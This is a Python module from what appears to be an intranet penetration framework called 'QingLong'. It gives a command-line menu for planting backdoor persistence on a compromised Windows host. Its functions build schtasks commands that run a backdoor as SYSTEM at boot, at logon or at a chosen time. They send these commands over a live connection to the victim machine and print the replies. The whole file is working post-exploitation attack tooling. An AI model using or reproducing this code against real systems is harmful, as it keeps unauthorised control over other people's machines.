import os
import sys
from prompt_toolkit import prompt
from prompt_toolkit.completion import WordCompleter
from prompt_toolkit.formatted_text import ANSI
from prompt_toolkit.history import InMemoryHistory
import struct

sys.path.append(os.path.dirname(os.path.realpath(__file__)))
from AuxiliaryFunctions import MyTable


def schtasks_backdoor(conn):
    commands = ["back", "show params", "show options"]
    completer = WordCompleter(commands)
    formatted_text1 = ANSI('\033[1;32;32m(QingLong Framework/Intranet Penetration)-\033[0m\033[1;31;31m[BackDoor/Permission Maintenance ~ schtasks] \033[0m')
    history = InMemoryHistory()
    while True:
        choice = prompt(formatted_text1, completer=completer, history=history)
        if choice == 'back':
            break
        elif choice == 'show options':
            show_option()
            continue
        elif choice == 'show params':
            show_params()
            continue
        elif choice.split()[0] == '0':
            command = "schtasks /create /sc onstart /tn \"{}\" /tr \"{}\" /ru system".format(choice.split()[1], choice.split()[2])
            receive(conn, command)
            continue
        elif choice.split()[0] == '1':
            command = "schtasks /create /sc onlogon /tn \"{}\" /tr \"{}\" /ru system".format(choice.split()[1], choice.split()[2])
            receive(conn, command)
            continue
        elif choice.split()[0] == '2':
            command = "schtasks /create /sc once /tn \"{}\" /tr \"{}\" /ru system /st {} /sd {}".format(choice.split()[1], choice.split()[2], choice.split()[3], choice.split()[4])
            receive(conn, command)
            continue


def show_option():
    print("\n" + '\033[1;34;34m' + "schtasks" + '\033[0m' + "\n" + '=' * len("schtasks") + "\n")
    headers = ['\033[1;34;34m' + "id" + '\033[0m', '\033[1;34;34m' + "model" + '\033[0m', '\033[1;34;34m' + "usage" + '\033[0m', '\033[1;34;34m' + "Description" + '\033[0m']
    data = [["0", "schtasks/onstart", "0 task_name backdoor_absolute_path", "设置计划定时任务,当系统开机时,后门程序自动执行"], ["1", "schtasks/onlogon", "1 task_name backdoor_absolute_path", "设置计划定时任务,当用户登录时,后门程序自动执行"], ["2", "schtasks/time", "2 task_name backdoor_absolute_path time data", "设置计划定时任务,用户设置规定时间,到了规定时间后门程序自动执行"]]
    MyTable.createTable(headers, data)


def show_params():
    print("\n" + '\033[1;34;34m' + "Parameter Description" + '\033[0m' + "\n" + '=' * len("Parameter Description") + "\n")
    headers = ['\033[1;34;34m' "Params" + '\033[0m', '\033[1;34;34m' "Description" + '\033[0m']
    data = [["backdoor_absolute_path", "后门在受害者主机上的绝对路径"], ["data", "日期,格式为年/月/日,如2023/11/01"], ["time", "时间,如02:50"], ["task_name", "任务名称,由用户自定义"]]
    MyTable.createTable(headers, data)


def receive(conn, command):
    conn.sendall(command.encode("gbk"))
    result_len = conn.recv(4)
    real_len = struct.unpack("i", result_len)[0]
    while True:
        if 1024 < real_len:
            result = conn.recv(1024).decode("gbk", errors="ignore")
            print(result)
            real_len = real_len - 1024
            continue
        else:
            result = conn.recv(1024).decode("gbk", errors="ignore")
            print(result)
            break
